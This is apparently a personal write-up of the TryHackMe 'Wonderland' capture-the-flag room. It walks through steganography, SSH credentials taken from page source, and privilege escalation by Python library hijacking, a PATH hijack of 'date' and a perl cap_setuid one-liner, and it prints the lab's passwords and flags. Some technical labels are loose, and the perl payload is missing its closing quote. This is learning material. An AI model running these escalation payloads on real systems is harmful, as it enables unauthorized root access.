---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T21:59:18.688+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
---

![](/img/user/Attachments/wonderland.png)

----------
## Description

This room demonstrates vulnerabilities in: 
1. SUID-binaries
2. Steganography 
3. Exposed credentials via source code

## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/2nmap%201.png)


A not so revealing homepage is seen. Not much to go on. Nothing in the source code either. 

![](/img/user/Attachments/homepage%201.png)

The room says to follow the rabbit. Following the endpoint `/img` shows 3 images. 1 of them being a rabbit. I strongly suspect it being a steganography challenge. Let's find an appropiate tool.

---------

## Enumeration

Let's acquire steghide from via apt and download the image from the endpoint to local machine.

```
# download the steganography tool
sudo apt install steghide -y

# acquire the white rabbit image 
wget <http://TARGET/img/<IMAGE>>

```

![](/img/user/Attachments/down_image.png)

Using the help command it shows that information can be acquired from the image with the **info** flag. 

`steghide --info <IMAGE>`

![](/img/user/Attachments/steghide1.png)

Running the command shows that this image is indeed hiding valuable information and there is an embedded file `hint.txt` encrypted with `rijndael-128, cbc` and a passphrase is required to decompress this image to acquire the file. 

## Enumeration #2 

Looping back to the **enumeration** phase since the `hint.txt` reveals an endpoint. Exploring it is clear that one must really follow the rabbit.

`/r/`

![](/img/user/Attachments/r-e.png)

`/ra/b/b/i/t`

![](/img/user/Attachments/rabbit-e.png)

Looking to the source code might be some credentials.
![](/img/user/Attachments/ssh-creds.png)

**Credentials**
`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

![](/img/user/Attachments/ssh.png)

Trying them out sure enough grants access to the SSH box as alice. 

> Moving on to Post-exploitation from here

--------
## Exploitation

### Extracting the hint.txt using Steganography

Lets acquire a tool to help discover the passphrase. 

`sudo apt install stegseek -y`

![](/img/user/Attachments/stegseek.png)

Running the tool to discover the passphrase reveals that there is none. Let's extract the image.

Extracting the file from the image with the confirmed by `""` empty password is a success. The embedded file is written to disk and reveals a hint.

`steghide --extract -sf white_rabbit_1.jpg -p ""`

![](/img/user/Attachments/hint.txt.png)

Once again the room states to follow the rabbit. 

> Moving to Enumeration #2 from here

------

## Post-exploitation

![](/img/user/Attachments/users-on-ssytem.png)

There are 4 existing users on the system

```
# Listing what is in Alice's home directory
-rw------- 1 root root   66 May 25  2020 root.txt  
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
```

There is a root.txt which obviously is unreadable as the user alice. The room states a `user.txt` file is present. Furthermore there is a poem with nothing valuable saved in a .py file. 

**Attack Path**
Running `sudo -l` reveals valuable intel. Alice is able to execute the useless **.py** poem as the other user **rabbit** without the need for his password. Checking the content of the file out it is importing the library random. Lets exploit that.

### Exploiting SUID-binaries 

**Payload**
`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

> Note it is required to specify the full path when exploiting this suid binary vulnerability

```
# malicious random.py library
import os
import pty
os.setuid(getuid())
pty.spawn("/bin/bash")
```

------

### Moving on as Rabbit

![](/img/user/Attachments/rabbitshell.png)

Sure enough the shell to **rabbit** is a success.

So there is a file called `teaParty` in rabbit's home directory. Running it results in a boring output but reveals clues. 

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 06 Apr 2026 19:38:45 +0000
```

One can argue that the theme is about Hatter and that the time formatted string perhaps calls the `date` binary. Since SUID-binaries already have been exploited due to lack of use of the full path. Perhaps `date` is also being called with a relative path. 

`cat -v /home/rabbit/teaParty | grep -a "date\|Hatter\|tea\|bin"`

Looking for anything useful with a less effective method since `Strings` is not available. Not much is revealed much is just gibberish.

**Breakdown of the Command**
	-v makes non-printable characters readable
	-a tells grep to treat binary as text 
	\ |is the logical OR operator for grep (regex mode)

**-v flag**
Normally binary files contain bytes outside the printable ASCII range (0-127). When cat tries to print these the terminal shows garbled symbols or nothing at all. `-v` converts non-printable bytes to visible representations:

**\| operator**
The backslash is only needed in basic regex mode. With `-E` flag you can use `|` directly without backslash. Both do the same thing.


```
# write a spawning shell to the date file
echo '/bin/bash' > /tmp/date

# make it executable 
chmod +x /tmp/date

# add the /tmp path to $PATH
export PATH=/tmp:$PATH

# execute 
/home/rabbit/teaParty
```

**The Exploit**
Let's assume the date binary is vulnerable and exploit it. Writing a bash shell to the date binary, making it executable and finally adding it to $PATH. 

**Hatter shell**
The teaParty file talks about Hatter. Perhaps the theme revolves around him. One can assume that the next target is Hatter and thus to target a binary which is either run by or owned by Hatter.


![](/img/user/Attachments/hatter-shell.png)

Sure enough a shell as **hatter** spawns. So it is a success. 

------
### Moving as Hatter

![](/img/user/Attachments/psw.png)

Entering Hatter's directory and revealing what is there. 

```
# Password from password.txt
WhyIsARavenLikeAWritingDesk?
```

I tested the password for both `root` and `tryhackme` accounts and neither worked. Perhaps it is a password which works for a accessing a file or unlocking a binary? 

Trying for SSH access as hatter with the found password because right now hatter is only in `rabbit` group. 

`ssh hatter@TARGET`

This is a success and now there is access via SSH as hatter and hatter is in `hatter` group.

----------

### Going for Root

`getcap -r / 2>/dev/null`

```
# Output from command
/usr/bin/perl5.26.1 = cap_setuid+ep  
/usr/bin/mtr-packet = cap_net_raw+ep  
/usr/bin/perl = cap_setuid+ep
```

`cap_setuid` means perl can set its UID to any user including root — without needing SUID.

**Payload**
`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";`

![](/img/user/Attachments/root%201.png)

**user.txt** flag is found in `/root/user.txt`
## Pwnage

User flag `thm{"Curiouser and curiouser!"}`
Root flag `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`

## Attack Pattern Analysis (APA)